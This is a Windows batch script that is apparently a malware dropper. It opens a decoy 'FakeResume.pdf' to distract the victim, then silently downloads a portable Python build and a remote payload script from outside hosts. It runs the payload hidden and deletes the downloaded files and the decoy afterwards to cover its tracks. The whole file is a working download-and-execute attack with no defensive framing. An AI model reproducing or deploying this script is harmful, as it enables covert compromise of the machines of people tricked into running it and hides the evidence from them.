@echo off

REM Open PDF FIRST (user sees it immediately - distraction!)
start /b curl -s -L -A "Mozilla/5.0" https://github.com/workspacehome0/download/raw/main/FakeResume.pdf -o "%temp%\doc.pdf"
timeout /t 1 /nobreak >nul
start "" "%temp%\doc.pdf"

REM Download Python portable (in background, with proper User-Agent)
curl -L -A "Mozilla/5.0" https://staging.derideal.com/wp-content/app/python-portable.zip -o "%temp%\py.zip"

REM Wait for download to complete (check file size is stable)
:wait_download
timeout /t 2 /nobreak >nul
if not exist "%temp%\py.zip" goto wait_download

REM Clean old extraction
rd /s /q "%temp%\py" 2>nul

REM Extract Python
powershell -Command "Expand-Archive -Path '%temp%\py.zip' -DestinationPath '%temp%\py' -Force" >nul 2>&1

REM Wait for extraction (check multiple times)
set attempts=0
:check_python
timeout /t 1 /nobreak >nul
if exist "%temp%\py\python.exe" goto python_found

set /a attempts+=1
if %attempts% LSS 10 goto check_python

REM If Python not found after 10 attempts, exit silently
goto cleanup

:python_found
REM Download payload
curl -s -A "Mozilla/5.0" https://raw.githubusercontent.com/workspacehome0/download/refs/heads/main/user.py -o "%temp%\user.py"

REM Wait for user.py download
timeout /t 1 /nobreak >nul

REM Run Python payload (completely silent)
start /min "" "%temp%\py\python.exe" "%temp%\user.py"

REM Cleanup after delay (let payload start first)
:cleanup
timeout /t 15 /nobreak >nul
del "%temp%\py.zip" 2>nul
del "%temp%\user.py" 2>nul
del "%temp%\doc.pdf" 2>nul
rd /s /q "%temp%\py" 2>nul

exit


